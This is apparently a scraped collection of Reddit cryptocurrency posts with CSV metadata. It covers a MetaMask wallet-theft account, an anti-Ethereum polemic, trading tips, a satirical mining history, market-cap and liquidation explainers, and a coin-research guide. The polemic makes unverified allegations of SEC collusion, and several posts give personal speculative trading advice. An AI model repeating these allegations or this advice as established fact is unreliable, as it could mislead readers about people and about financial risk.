my wallet on his pc and started emptying it out. At this stage I'm becoming less angry about what's gone and becoming deeply worried about the rest.I send frantic emails to MM which aren't answered until late in the evening and the next morning (which basically tell me there is nothing that can be done in my case and be more careful next time - thanks guys, will never be using you again.)At this point, the major weakness of MM finally hits me. Forget the convenience, if all goes wrong I have literally NO way to stop any transactions (hell they don't even show in my wallet but I can see them on zapper) or freeze the account. Consensys may have built a nice chrome extension but it's useless if there's a problem. At some point I look up and see that more of my coins are disappearing. 20 odd STETH suddenly disappearing is especially painful. I check on zapper and can see he is putting in ETH to put up gas fees to move stuff off the Defi sites and liquidating my coins and moving them out. Now I'm actively watching the account on zapper. Whenever I saw ETH come in I tried to first move the coins to my ledger but every single time it just goes to another unknown wallet. WTF? I eventually understand that they have copied my account on a different pc and are probably running a script to automatically outbid me. I had watched my one YFI go - that hurt as I had spent a BTC on it lol. I watched my 104 ALCX go - another 15 ETH gone in smoke. My whole accounts looks fucked and all I can literally do is watch.Around this point I send my first panicked message to Reddit that I was down 130k and likely to lose the whole lot. I figure maybe between the likely ridicule and crap I will get, maybe I will get lucky with some help. In the meantime all I can do is try to run slight interference by trying to move some of the ETH that the thief was adding to another account. Strangely moving ETH to another wallet appears to be the only coin I could impact. When I can moved it I try and run a tx and cancel it with a high gas fee to disrupt the ETH balance and screw up his transfers. This slows the bleeding but it's not over and I don't know what I can do. I read messaged here about trying other pcs, logging out of MM, I try it all and it does no good and makes me more stressed that the scammer might be stealing more when I'm not watching.When I first posted on Reddit I was down about half with the remaining amount staked on curve (alcx/ETH LP, zrx/ETH LP, ETH/stETH LPs) which was around 120k. Don't know why they were last to go but thank god they were there.In between the usual trolls and assholes calling me a liar, there were messages of support and some very helpful suggestions on then flashbots discord sub (initially sent to me by the SNX subs).I messaged flashbots and Alex from there got in touch. I gave him full info and access to my ex to verify it was mine). Even he commented that I shouldn't do this (lost track of how many times I heard that yesterday) but as my account was already compromised I had to trust it would be okay as without it he couldn't do anything.He explained that he would first set up a burner so any ETH coming in would be immediately burned leaving no gas for transfers. This was quickly set up which closed the gate on the thief for the short term. For those of you checking the wallet history you can see some incoming ETH which then immediately is removed - that scammer's ETH he's wasting now. I didn't want to alert him as to what was happening, so there was minimal mentions of this on my posts to Reddit, which I was still checking as this forum sometimes has some very useful feedback and suggestions.Over the next 8 hours Alex managed to move the remaining balance to a hard wallet and basically recovered all of my remaining balance minus some dust and dai staked on alchemix which I can't get back so it's all there which was around 117k out of 120k. I don't know how he did it - if you really want to know go to discord and ask him - but I am overjoyed that he did what he did. It's amazing for both his stepping in and spending hours to save this and no less for his 100% total honesty and integrity. If he had moved the coins elsewhere and told me it was the original thief I would never have known.In the end I've lost about 55 ETH and saved about the same (values were all over the place as the market tanked in the evening).I didn't post for moons or karma. I posted as a warning and for help and I'm glad I did. I would never have found the courage to trust flashbots without it. I would not have been alerted to the scammer using Kraken to deposit the stolen coins.To those of you who offered financial support/crypto/gofundme, thank you so much but there is really no need. Alex has saved a big chunk and I will be alright. Losing this amount of coins thanks to a scam is painful but if I couldn't stomach large swings I wouldn't have held on for years - if I can live through a few 80% drawdowns in BTC and ETH and recover, then I'll come back from this okay (however for a while I will stop measuring my crypto value in $ rather than #coins lol).Thank you very much to everyone who offered emotional support and well wishes. They are very much appreciated and more than make up for the large number of trolls and morons who like to throw around shit. Please don't worry about me. My wife, whilst initially shocked and upset, is fully supportive and I have every confidence I will do really well (especially after EIP 1559 and later ETH 2.0)To the libertarians, outraged that I've swung to side of more regulation, I want to say that I still believe that you should do what you want - legally. It doesn't have to be totally anonymous - hell half the problem with the current version of the internet is anonymous trolls venting lies and crap everywhere. For crypto to go truly mainstream you need some degree of safety and the ability to follow up and prosecute crimes. Watching some c*** screw me over in real time was an infuriating and humbling experience and definitely made me resent the anonymity of the scammer..BTW for those of you who go on about being your own bank good luck and come back to the real world where actual banks are regulated and safe (unlike the current Wild West of crypto Defi) and remember many of us don't want to be our own bank. I never thought about being my own bank and bought coins like ETH for other reasons. I like the blockchain and the crypto space as they are exciting and disruptive ideas that will hopefully make a new version of the internet in due course and change the world. However like the internet 2.0, no matter how it starts, eventually governments will step in and more regulation is coming. Mr scammer, I've already reported you to a bunch of exchanges where you seem to be staking your stolen coins and even if I can't get you immediately, your records are permanently there on the blockchain and one day you will be fucking found.Finally thanks again to Alex!For those of you who asked about him, his Twitter handle is @amanusk_Check him out, he's a true legend and a gent.",False,If you want to join me in watching metamask account get robbed by some asshole look below,INACTIVE,278,10913,0.85,https://www.reddit.com/r/CryptoCurrency/comments/oip4mi/if_you_want_to_join_me_in_watching_metamask/,[]

It is a shame that people forgot downvotes are supposed to be used to penalize off-topic and not to punish unpopular opinions, not to create echo chambers.    So let's get to it shall we?   **ETH is shady:**  Not only is ETH a security, it has always been manipulated by well connected and powerful people behind the scenes. The connections between the ETH Foundation, ConsenSys, and the SEC are totally public knowledge. Jay Clayton, the former SEC chairman, was a partner at Sullivan and Cromwell.    Joe Lubin, co-founder of ETH, also founded ConsenSys. He also bought 9.5% of ETH supply.   ConsenSys is a client of Sullivan and Cromwell.  That was the back door ETH used to get the free pass on regulations.  There are court papers about the meetings between ConsenSys and the SEC.  At the same time, the SEC was prosecuting DOZENS of ICOs that were using the exact same approach ETH was.  Hinman's, Clayton's Director of Corporate Finance, speech where he says ETH is not a security was partly WRITTEN by some of ETH top investors.  The plan by ConsenSys with the help of the SEC was clearly to make ETH the only crossborders payment platform by giving it a free pass, while at the same time preventing any incursion into that space with SEC lawsuits.   At the same time this was happening, Gary Gensler told an MIT audience that XRP deserved regulatory clarity.  (I won't go in depth with the Ripple lawsuit here).  Not only is Chairman Gensler trying to pretend he never said that, and the entire SEC trying to hide the fact they gave ETH a free pass, to date ETH is the only altcoin to have had the privilege of being formally consider a commodity/currency and not a security.   Other funny coincidences include: Claydon being hired by a crypto hedge fund 100% invested in BTC and ETH. SEC Enforcement Director Marc Berger being hired by Simpson Thatcher and Bartlett, part of the ETH Alliance and Hinman's prior employer, less than a month after the Ripple lawsuit was filled. Hinman receiving $15 Million, during his service on the SEC, from  Simpson Thatcher and Bartlett. AND after leaving the SEC, Hinman returned to  Simpson Thatcher and Bartlett as a senior crypto adviser.  **ETH is centralized:**  Users and nodes have no real power to shape the protocol. This is virtually true of all protocols with a Foundation at it's head, but we can't forget ETH falls under this group.  The first piece of evidence here is the ETC hard fork. This fork happened because the wrong people lost money. The changed the code and the protocol for the first time to suit the wealthy whales and not the users or miners. They changed the rules to fit their goals.    The second piece comes in the form of changes to mining rewards. This was a blatant attempt to decrease supply by not paying the miners. More important than the way it impacts the economics of ETH, it points towards a centralisation of power. Rules can be changed on the fly with no consideration from the community but based on profits alone for the higher ups.  This leads us to the PoS change. This has nothing to do with energy concerns or with price of fees. This is meant to skip all the intermediate problems by getting rid of miners and let the token holders leverage their will directly. Don't forget the LUDICROUS amount of ETH that was pre-mined.  Every hard fork the Ethereum blockchain has enacted has always been for the benefit of the few, never for the benefits of the community. You know what that looks like? Our current banking system. Where the citizens and the working class pay the price for mistakes and reap none of the rewards for profit.  People in this sub hate central bank digital currencies, failing to see that every abuse these could enact on the public, so can Ethereum upon it's users.    To quote one of my sources Etherium is not a decentralized peer-to-peer system. It is a system with an unaccountable ruling class exploiting the working class, making promises they can't keep, while spinning a wonderful narrative.    **ETH recent and future design is bad:**  Everyone was fooled into thinking EIP 1559 was going to be a good thing. How the Foundation pulled that off is honestly mind boggling.  This change made it so fees were more uniform. Uniformly high. And making sure that miners saw none of that profit by burning it.   Burning the fees essentially made sure that the biggest holders get they profits increased because every ETH is worth more, while miners that actually keep the network safe get a pay cut because there are less fees per block for them.  But the biggest problem is that you are getting a landlorded network to users. If you want ETH to be useful, you need to, well, use it. But this model makes it so the interests of holders are opposite to the interests of users. Users want lower fees so they can use the network to transact, but holders want higher fees, for more burn and more profit.  Taking money out of the pockets of miners decreases security. If you are paid less you have a higher incentive to get your money some other ways.   And since users and holders have different agendas, future goals benefit different people. An interesting question would be for instance what happens in the case of a block size adjustment? Bigger or smaller block sized benefit users and holders differently.Well, given ETH's history, you know how those chips would fall. Even this decision was reached by a small amount of key players.  And PoS will only make this whole process more straight forward. The fact that the token holding are already so centralized will make changes easier for the ruling class and be baked into the system.    **In conclusion:**    ETH's had a shady start, has been controlled by a group of shadow players on the background, is becoming less and less secure and has no intention of not being.    At any point, any decision can be hard forked in. The miners don't matter. Your nodes don't matter.  ETH is INTENDED to shackle you the exact same way the current banking system does.    Don't be fooled.**Sources:**  https://tomerstrolight.medium.com/the-problem-with-ethereum-af9692f4af95https://www.crypto-law.us/the-ethereum-free-pass-fair-notice-and-the-fight-ahead/https://www.coindesk.com/policy/2021/09/17/ethereums-design-choices-are-inherently-political/      EDIT: I was enjoying the discussion in the comments, but I am getting spam downvoted so I will have to stop.

I was in crypto briefly in 2013, but only really hit the ground running in 2017 and never looked back.  In 2017 I made all the usual mistakes, got into the wrong coins, entered some dodgy exchanges and sold the wrong coins (like selling Enjin on its first day after investing in the ICO).  In 2018 things got worse, with shitcoins driving the BTC value of my holdings down by half.Now I'm sitting really pretty and feel like I have 'clicked' to the point where I am generally making money in crypto and quite a few people ask me for advice on what to do, strategies etc.  Here are some of my tips, observations and ideas.1. Don't trust anyone.  Assume everybody you are talking to is a friendly thief who wants your money.  That includes people shilling particular coins, or anyone asking for your crypto to invest, to random people that message you.  (And yes ironically this means don't trust me, but you'll see I didn't mention my altcoin holdings and I am deliberately staying quiet on what my 800% defi pool is  :) )2. Every position you enter should be a fixed percentage of your portfolio.  I prefer 1% for a typical trade.  Risky uniswap gems might be 0.5%, very strong longer term positions say 2-5%.3. Have your portfolio value in BTC (or ETH if you prefer that).  Your goal is to increase your BTC value.  Each trade should be from BTC, and then exit back out of BTC.  Log all transactions in blockfolio etc under the BTC pair, so you can see how much BTC value you are gaining.  Don't worry as much about USD gains, as in a bull market its easy to make USD value gains.  BTC is the end-game here so you want to accumulate BTC, especially if BTC dominance is falling.4. Have a portion of your portfolio allocated to farming or staking.  If you have a coin sitting somewhere for ages, ask if there is some way for you to make money from it.  For example, I have a large stack of BTC and ETH, so rather than have it sitting doing nothing, I wrapped the BTC and entered a Sushi Farm.  Months later the rewards from that farm are worth something like 25% of the amount I initially invested.  Every so often, harvest the rewards and either re-farm (compounding) or shift to your long term hold.  Remember compound interest.  There are opportunities for very high returns (without ponzi aspects but be careful) - find those, constantly take and re-invest the income and the gains are quite extreme.5. Have a dedicated stack of BTC or ETH that is your 'HODL' portfolio that you never touch.  Preferably in seperate legal entity (like a trust) than what you trade with.  This will help for taxes.  Every so often, move some profits into that long term stack.   I don't do anything with that stack at all, it is just my safe holdings.6. Spend as much time learning about tax as you do trading.  Tax is something you kind of need to understand upfront - you can get way more rekt from bad tax approaches than you make gains with good trading.  And keep your records safe - download all trade histories at the end of every quarter.7. Use telegram (or discord).  Find really helpful smart and useful people and stick to them.  Find helpful trading groups.  Eventually they will be a vital source of information or just ways to bounce ideas off.  Check out my previous post for a full guide on 'must have' telegram groups.8. Read the crypto news as much as you can.  Its amazing how often something pops up (e.g. grayscale announcing new trusts with other coins) and there is still a decent amount of time to buy.  And always have some BTC on an exchange ready to buy on such an opportunity.  Again, telegram is great for this as you can quickly see tweets or news-links being shared.9. Have a preset % of gain or losses whereby you will sell if it reaches that.  For example, for most coins, if a coin ever goes up more than 30% vs BTC in a day I always sell.  95% of the time that works out as better than holding.  In the rare event I double my position I always sell the principal immediately (I did this twice this year - with Ethernity and Blind Boxes).10. Always have an idea as to what the current 'climate' is in terms of what is moving and in favour.  Crypto markets often move with certain sectors at a time.  For example, if you look at the Coin Gecko categories list, you can immediately spot what is 'hot' right now.  Last month it was NFTs, so I was heavy in that space, but now that sector is cooling.  The binance smart chain and exchange coins are doing very well right now - if that is the case what else might move?  Well other low gas blockchains could be an idea - especially if they have defi - so Avax, Raydium etc are all moving too.  Soon it might well be BTC's time to gain as the expense of alts.  You should be rotating in and out of positions to try and go with the ebb and flow of the market.11. For newcomers, start with basic stuff like accumulating bitcoin, learning to use a wallet, security etc.  Don't just dive in and ape into defi coins, wsb style.  It may suck that it feels like you are missing all the gains from the 'hot' new coins, but it will equally hurt if you are just burning through your capital.12. Look out for free crypto opportunities.  They key here is sorting out the gems from the scams.  This isn't just staking etc but also things like reddit moons and airdrops.  A lot of people are even 'airdrop farming' whereby you have wallets that carry out certain activities deliberately to try and qualify for future airdrops.  Coin market cap earn and coinbase earn are two more.  Even something like the binance 'dust' feature to turn dust into bnb is a way of generating some more bnb (even if its tiny).  Check out my previous post on free crypto and ways to get passive income13. For farming, make sure you are using the right apps like zapper or apy vision to track all your positions, your yield and any impermanent loss.  That will also help with tax records down the track, should you need it.  Watch out for farming on the ETH network as your gas fees will chew up any gains if you have small positions.  Check out my previous post of sushi farming for how the rewards and gains work14. Track all your numbers, your gains, your investments and portfolio change religiously, preferably in an excel document.  That way you'll know how you are performing and if something is going wrong.  Again, I wish I had done this more in 2018.15. Have an 'emergency reserve'.  For me, this is actually my stock positions, many which are crypto related, but you could have gold or cash (I especially like the idea of something like stable coins lent on FTX at a decent interest rate).  If we get some kind of crypto turbo dump which is 40%, you can then have that as money on the side-lines ready to buy.16. Constantly educate yourself.  For me, I still need 3-4 hours a day to research and learn about crypto.  I find crypto podcasts and even youtube vital sources of information, provided you are listening to the right people.  Mix up your education with news, technical strategies, trading updates, altcoin news and even just the general philosophy behind sound money and financial sovereignty.17. If you win or lose on a trade, delete that coin from blockfolio immediately.  Why?  Because you have exited that position, and seeing it jump up again in price is just going to torment you.  You've made the decision to sell, don't even up revenge trading where you come back and try and get your losses back on the same trade.18. Never margin trade UNLESS it is only because you want to minimise your funds at risk on an exchange.  Even then I'd avoid it.  Unfortunately many exchanges make this very hard to use - and there are confusing terms and default options which can rekt you (for example, positions that will drain your other funds instead of liquidiating the trade if falls too much).  In fact, I avoid almost all USD pairings and only trade BTC pairing, unless very special circumstances are in play (such as ripple being delisted from coinbase).19. Never hold more than around 10 coins.  I used to have up to 40 at a time, it became impossible tracking them in terms of activity, prices, and god the horrors of trying to maintain enough wallets for them.  10 is enough diversification.  I used to have a 'bag' of around 15 moonshots - that strategy never worked as even if one 'Gem' actually made it big, the losses from the other ones cancelled out.  Typically if I had a huge gain from one of my coins, I sell back to BTC and waits for other opportunities.  This isn't Pokemon - don't try and 'catch them all'.20. Falling in love with alt-coins is like falling in love at a stripclub.  Yes trade them.  But just be conscious that their chances of beating BTC long term are very unlikely.  Just look at all my 2013 gems (peer coin, feather coin etc).  Heck I bought World-Coin because I read about a 'bitcoin genius teenager' who made millions from crypto and said World-Coin was the next bitcoin.  And I've made my mistakes as well going forward, holding on for dear life for nano (yes I know its fast and instant!) and grin.  I think the tech for both coins is great, that doesn't mean its a great trade.  If you want to marry your alt-coins then you will be lucky if you only lose half your money like a real world divorce :)21. EDIT. Bonus one.  Always learn from your losses (and I have MANY).  I like to think of crypto as like a computer game where you are gaining new skills.  Think of RPG games like Baldur's Gate or Warcraft.  You can earn money or experience, and use that to gain new items or skills that protect you against certain things.  So maybe you lost $500 to a 'rug-pull'?  Well do your research and figure out how to avoid that next time.  Maybe you'll spend the next 2 weeks mad about it, but next time a potential rug-pull project comes along you'll dodge it - congratulations you now have learned 'immunity to rug-pulls'.   Keep learning and gaining more experience and you'll start avoiding all the traps.22. EDIT 2:  You are going to have MANY scenarios where you see a coin that has gone x1000 or to some ridiculous crescendo, where you feel utterly compelled to buy to avoid missing out.  This is the obvious trap (if you want an example of this look at Safemoon right now.  Bitconnect was the one in 2017 and there are others).  At some point bitcoin or ethereum will do a similar run up, and many people outside crypto will do the same thing.  Yes this can be irresistible but you must resist the temptation - think of the cryptos has being a bunch of boats on the wharf, and there are thousands of boats.  Every day another hundred turn up.  Why are you going to try and jump across the water to get to the boat that is already leaving, when if you wait a bit another few dozen will turn up in five minutes?  You'll just fall in the water and miss out on those new boats!23. If you must trade as a new-comer, I highly suggest trading the smaller / middle cap BTC pairs.  Not the USD or margin pairs.  Certainly not something like futures contracts on FTX.  Why?  Because if you are on bitmex / bybit / ftx etc you are swimming with the whales and sharks, quant funds, robo-traders and the like.  If you entered the casino for the first time in your life, would you immediately go to the blackjack table with James Bond and Dr Evil?  The smaller BTC pairs are more likely to have less experienced traders - my trades actually went positive once I moved from USD pairs on margin exchanges to spot BTC trades with altcoins.24. Last edit before bed (I promise).  The chances are, crypto is still cyclical.  That means we will have another bear market, or at least a very long boring period of no gains.  If you have just joined crypto, you probably won't 'make it' this cycle, as we may only have 6 months to a year to go.  I actually lost money (a lot) in BOTH the 2013 and 2017 bull markets (-50% and -85%, respectively).   All of my gains were made in the bear market when I was buying BTC and alts when BTC was in the 3ks.  The 'will you make it?' test isn't coming now when the market seems to be going infinitely up and everybody is winning.  That test comes when everybody is selling and it seems like you are the only buyer.  And yeah, thousands of alt coins will suffer or die at that point.   So be around to scoop up the ashes - don't be the ashes!  This is all a larger part of learning to move with the cycles.Anyway these are the ones that come to mind, hopefully that is helpful!  No doubt I'll edit this post and add a few more.",False,I'm been in crypto since 2013. Maybe 700+ alt coins and many trades. Now a Defi-Crypto Farmer.

The price is crossing $2. It's May 2011, I am mining on some number of Radeon 5850s, doubled. Mining difficulty is climbing quickly, and so is the price. We're almost at $10 by the end of the month and I'm still making around 1 BTC per day, somehow managing to stay on par with the difficulty as I buy more graphics cards.It's early June, and as I am powering on even more GPUs, the price hits roughly $32 before halving over that weekend. November 2011, we reach $2 after several months of everyone declaring it dead. I am on something like 8 5850s now, probably still making around 1BTC, maybe a bit less, it's difficult to remember after 10 years. After the monstrous crash of about $30, things begin to pick up by the end of the year and we enter 2012 at about $5.We crash from $7 to $4 between January and February, then from $13 to $8 over one weekend in August. It's dead, each time.It's 2013 and things are batshit insane. We have some minor 10% drops through the year but everyone is buying. Everyone is mining. I heat my new rental property with Radeon 7990s and only heat the house with graphics cards during the entire winter from 2012-2013. About 11 steps up the stairs, you go from freezing cold to being blasted with heat, like when you exit the plane into Spain.By April we all lose our shit and people are buying bitcoin for $100. By the 9th they are paying $200 and within a week decide that $70 is more reasonable - a 66% drop in a week. Of course, people can't make up their minds whether Bitcoin is a scam or if it's the future of humanity, so the price goes haywire and we see regular gains and drops of 10/20/30%.It's November 2013. Bitcoin is not a scam. Clearly, because it's now worth $200. Or is it worth $650? No, it's worth $550. Now it's $700. Nope, $1,100. Now it's $950. Now it's December and it's $1,100 again. But what the hell is going on, MtGox won't let me log in despite me not sleeping and spending the last 15 hours through the night trying. Now I'm late for work and I've lost 20% of my money, even though I've actually gained 1000% this year, I'm only bothered about losing 20% of what I had a day ago, just like literally everyone else.It's 2014. It's also most of 2015. The entirety of both years. Bitcoin is dead. Never coming back. We're down to $200. Mining still makes me the same $2-3/day that it ever has, even though the 1BTC/day from 2011 is now worth $200+/day. I give up. Everyone else gives up after buying these new things called shitcoins. I forget, not bothering to sell what I had left as it's barely enough to buy a small used car. It's 2016 and apparently Bitcoin has tripled since I last looked at it. What. You what. What. Everyone now wants Ethereums. It's like Bitcoin, but it'll fit on my hard drive. Everyone's shitcoins have disappeared. The however many thousands of Doggo coins I mined before I quit have disappeared along with the exchange. Ethereums are bringing out these new shitcoins that actually do something, like Golem, which is like Seti@home but will eventually literally do everything and generate an income for you. Great! Ethereum shitcoins are not called shitcoins. The world of cryptocurrency is very different to how i remember it. I swap half my BTC for ETH and then 80% of that for various tokens.It's 2017. Nothing bad is happening. Everyone is investing in ICOs for non-shitcoins. Everyone's making $2k/day just trading. Everyone's also making $500-2k/day just holding. Everyone has bitcoin and ether, as well as a tonne of ERC-20 tokens. Some people also have Bitconnect which seems very much like the HYIPs I used to join during my PTC/PTS days as a teenager. Seems like a scam, no good. Ethereum has several 20-30% drops throughout the year. Seems normal, I'm no longer phased after 2013. Everyone in my office is interested. They all discuss it at $10, but ask me about investing $15k when the price hits $300. Finally, they enter at $600 and no one does any work for the rest of the year. We just talk crypto.It's the second half of 2017. I make more on crypto in one day than at my day job in a month. Literally everything is going up. No one considers that it'll ever drop again. I'm like: 'ü§∑‚Äç‚ôÇÔ∏è Looks pretty normal to me, but I better sell some soon else..'...Actually, it's January to April 2018. New York bonuses or Chinese New year or some seemingly random event makes everyone sell literally everything. Everyone had put all their bitcoin into ether, and then all their ether into ICOs. What was once 25BTC was now 400,000,000 various ERC-20 tokens, or kittens, worth around $200. Not only did everyone sell their tokens, causing them to crash, but everyone sold everything else, making everything else crash. Crashception. Every second word on reddit is 'crash'.Ether went from $1,200 to $75 in a year or so. Declared dead by everyone.It's 2018-2020. I'm like, well, not sure. Probably will repeat the cycle of dips, moons and crashes, but probably should have sold. How many Deloreans could I have bought? Better not check my 'How many Deloreans I can afford if I traded all of my cryptos for deloreans.xlsx' spreadsheet. My heart and soul must be dead. I have felt no emotion or regret during the crash. 2013 had used up all of that. All of my colleagues are bored and stop talking about crypto. Despite what they said, they weren't interested in the tech, only the money. One buys a folding phone for $1,500 with what was once $10k of Galaxy Ripple chocolate bars, I think. I buy more Ether, deciding to not exchange any for other tokens. From now on, only BTC and ETH for me. I buy some occasionally, but not as much as I should. I pretty much leave crypto will the expectation that we'll just repeat it all again in a few years.It's 2021, things are batshit insane again. Already?Woopdedoo. Everyone's talking to me about crypto. Fgs. I just decided to try the real stock market where people cry over a 3% crash. Everyone is jumping back in. What is defi and nft? Are cryptokitties nft? Is my kitty still alive? Who knows. Give it 5 years and there'll be a yet another new equivalent to shitcoins.Bitcoin drops by $10k in January, I'm like, meh. I play with Coinbase Earn and shortly make a mint.It's the present: Bitcoin drops another 10k in February, even though it's still higher than the last drop. I'm like, meh. Everyone panics. For some reason I decide to write a 20 word reddit post and it turns into whatever the hell I'm writing now for whatever point I'm trying to make. Something about not declaring it dead over a $10k drop when we're still up by $20k this year.It's mid 2021. Bitconnect is back and they want your doge. Bitcoin hits $80k but crashes by 20% down to $64k. The world is on fire and shit is hitting the CPU fan. It crashes by another $5k before hitting $85k. Ether was $4k but now deemed dead because it's only $2k. Soon it'll be $5k. Elon tweeted about doge being the national currency of Mars. It's a joke, but now doge is $42 and I remember that old exchange that vanished with probably $420,000,000 worth of my doge, and 50 LTC. Twelve seconds later it's back to $0.10. Everyone is mad because it is now only worth double of what it was worth yesterday, even though it is down from ,12 seconds ago.It's every other year from now until the end of eternity.. Everything crashed by 50% overnight. Now it costs me 250 satoshis or less for my latte. Ether is $1^26 or something and no one knows what is happening anymore. The price went so high because 10 billion people on Earth use it daily, either directly or because their car automatically pays for tolls on the Ethereum network with that project from Oaken Innovations that hasn't been updated in years, that now no exchange can display it correctly or something. Everyone is now an NZT or NFT or POS or some other acronym. While I'm working, my phone earns me 0.2 GLM, my fridge earns me 4 MYST, my washing machine earns me a few E-DOGE, all while I process medical simulations and allow some family in China to access wikipedia without their government seeing. My family on Mars send me some DOGE to keep me afloat. Ripple is still being investigated by the SEC while their owners siphon another $100m each year. The price of all cryptos goes 10x every other year but it's all dead when it drops 10-20%.It's the end of this post. I've no idea what's going on. Has the crash reverted in the time that I've written this? How many Deloreans worth of crypto have I lost today? How many Deloreans worth of crypto have I gained since the start of the year? I look at the price of literally every crypto and see a 10% drop after an unlimited % gain since inception and several hundred percent just this year or so.Its the end of the end of this post. I consider how to end it, but instead have two endings. Things don't make sense. I consider changing the title to reflect my original intention of pointing out how a 10-20% drop is pretty much to be expected with crypto and that by looking at the bigger picture, you won't even see this dip on a chart next year. Instead, I do whatever I am doing now.

If you buy some now and they become as expensive as Bitcoin you will be rich! Bitcoin also used to be cheap! Right?Lol, nah, wrong, obviously. The thing is: coin price doesn't matter. At all.

But there are 660,000,000,000 BTT at the moment and there will be 990,000,000,000 at some point.

So if we imagine BitTorrent becoming just as big as Bitcoin, how much would a single coin be worth? $1.38. So can't a single BTT be worth thousands of dollars, like BTC is? No, absolutely not.

If you don't know what market cap means and you're trying to get in early on moonshots, I'm begging you to take 2 minutes to read.Market capitalization is the total value of all members of an asset. Just circulating supply * price. (Edited note: worth mentioning that you should be using the average price over different platforms. THAT BEING SAID: if the platform you're looking at shows a price that would imply a market cap in the quadrillions, then that DOES mean the price is too high there. Even though the market cap calculated by that price wouldn't be an accurate measurement of the combined value of the coin, it IS a good indicator of whether or not it will actually be able to maintain that price. If it's not an accurate price, arbitrage is going to correct the price soon enough.) What does it tell us? It lets us know how much ~~money~~ value is attributed to it, and how it compares to other coins.Take SHIB for an example. It has a circulating supply of **400 trillion tokens,** so at its price of 0.003¬¢, it has a market cap of nearly $12 BILLION. That's 1/5 of doge's cap of $60B, and it is therefore already one of the largest cryptocurrencies out there.At 10¬¢, the market cap would be $40 trillion, double the US annual GDP. It will not hit 10¬¢. It will not hit 1¬¢z It will not hit 0.1¬¢. It MIGHT hit 0.01¬¢ because of how the market has been working lately, but those other targets are just mathematically far too high.(Another edited note: when I say reach that price, I meant having a stable price that high on most/all trading platforms. Thanks to those of you who corrected me on that)The creators want you to see all those zeros in front of the price and assume buying it would be getting in early. Don't let them fool you. You are not getting in early by buying a coin with a $12B market cap. You are almost certainly very very very late.DYOR. Please.Edit:A lot of people are hung up on how much money is in it. I didn't mean it in terms of principal investment, I meant it in terms of valuation. I have a lot of BAT that I bought at 30 cents. I don't value it as if it were the 30 cents per token that I bought it at, because I know I can just sell at the market price if I need to.The argument that it would crash if everyone tired to sell at once is fallacious. It's valued at what it is and it ISN'T crashing to nothing from everyone selling at once because people aren't trying to all sell at once. They would rather have the BAT than the $1.30. If they didn't, they would have sold already.Edit 2:Think I came off wrong here. Not a financial expert, that much is obvious. I know that things can crash from everyone selling, I was trying to say that everyone selling is BECAUSE they value the coin's value in fiat/btc/eth/whatever less than they do the coin.Second, I know there are flaws in it, as it can't be instantly converted. I'm not trying to make it out to be some perfect metric of value. My intentions here are solely to tell people that their millions of scamcoin that they bought for $10 probably is not going to make them a 9 figure crypto whale.Edit 3: u/ReachOutLoud broke down problems with  a lot of my points.

When they get liquidated, Binance will sell your crypto for Tether, and you are left with little to nothing.So what happened? Crypto got sold, and Tether got bought. Because Crypto got sold, the price drops, which triggers more accounts, who thought they were safe, to dip below their margin maintenance requirements.This creates a feedback cycle which basically ends in the liquidation of all the margin accounts.

They hold 1691 BTC, in comparison , Microstrategy and Tesla hold over 120,000 BTC  and 40,000 BTC respectively. [El Salvador's total foreign exchange reserves is pegged at $3.3 BN](https://data.worldbank.org/indicator/FI.RES.TOTL.CD?locations=SV)https://tradingeconomics.com/el-salvador/foreign-exchange-reservesLess than 2% of their reserves are in BTC.[El Salvador holds more in GOLD than in BTC](https://timesofindia.indiatimes.com/business/cryptocurrency/bitcoin/bukele-reveals-el-salvadors-gold-reserves-and-benefits-of-bitcoin-over-gold/articleshow/88142021.cms)According to this article, they hold $79m worth GOLD, but just $70m worth BTC. People are spreading the false narrative as if he has moved the entire supply of reserves to BTC, which is far away from whats going on.They have just been making small purchases over time. They literally bought like 2 BTC in the end of Dec. Peanuts for a country.A 2% allocation in a risky asset class is not a gamble by any means. It is a decent risk reward play for individuals, and countries as well. If you consult with a financial advisor, they may suggest a portfolio allocation of 2% towards emerging asset classes like crypto. Infact, thats what Fidelity suggests as well. [Recently, they added a 2% BTC allocation to their flagship All in one Balanced / Growth funds](https://www.investmentexecutive.com/news/products/fidelity-to-add-bitcoin-exposure-to-portfolio-funds/). These are mom and pop funds that are held mostly by conservative investors. Its been around a year since El Salvador announced their Bitcoin Law and around 6 months since it went active. In this period, they have allocated a small portion of their reserves towards BTC. This is not a gamble, but a solid  and well planned asset allocation strategy. Meanwhile, they have already started mining BTC and over time, this industry has the potential to add to their GDP. What did people think bitcoin/crypto adoption would be like, one fine day every country across the world will just start accepting BTC out of the blue? Just like that it would become legal tender without any struggle? These are small steps and it will be risky. Nothing happened overnight, let alone moving from USD to a decentralised currency like Bitcoin.Its shameful that people here want adoption of BTC and crypto, but the first time a large sovereign power has tried to adopt BTC, the same people who want crypto adoption go out of their way to attack them with baseless allegations. > Muhh adoption should be in accordance with my terms, otherwise its not adoption. These people are just privileged bottom feeders who want to enjoy success without any risks whatsoever.",False,"El Salvador holds less than 2% of its reserves in BTC, they hold more GOLD than BTC.

This is the first pass of the bullshit detector and you can tell from a lot from just the website whether its a scam. If it uses terms like 'Web 4.0' or other nonsensical buzzwords, if its unprofessional and has anonymous teams, stay away. Always look for a roadmap, compare to what was actually delivered so far. Always check the team, try to find them on LinkedIn and what they did in the past.- Read the whitepaper or business development plan. You should fully understand how this crypto functions and how its trying to create value. If there is no use case or if the use case does not require or benefit from a blockchain, move on. Look for red flags like massive portions of the float being assigned to the founders of the coin, vague definition of who would use the coin, anonymous teams, promises of large payouts...etc- Check the blockchain explorer. How is the token distribution across accounts? Are the big accounts holding or selling? Which account is likely the foundation account, which is the founders account?- Read the subreddit and blogs for the cryptocurrency and also evaluate the community. Try to figure out exactly what the potential use cases are and look for sceptical takes. Look at the Github repos, does it look empty or is there plenty of activity?## 2) Fill out an Investment ChecklistI have a checklist of questions that I find important and as I'm researching a crypto I save little snippets in Evernote of things that are relevant to answering those questions:- What is the problem or transactional inefficiency the coin is trying to solve?- What is the Dev Team like? What is their track record? How are they funded, organized?- Who is their competition and how big is the market they're targeting? What is the roadmap they created?- What current product exists?- How does the token/coin actually derive value for the holder? Is there a staking mechanism or is it transactional?- What are the weaknesses or problems with this crypto?## 3) Create some sort of consistent valuation model/framework, even if its simpleA simple model that just tries to derive a valuation through relative terms will put you above most crypto investors. Some simple valuation methods that anyone can do:- Metcalfe's Law which states that the value of a network is proportional to the square of the number of connected users of the system (n2). So you can compare various currencies based on their market cap and square of active users or traffic.- Another easy one is simply looking at the total market for the industry that the coin is supposedly targeting and comparing it to the market cap of the coin. Think of the market cap not only with circulating supply like its shown on CMC but including total supply.- 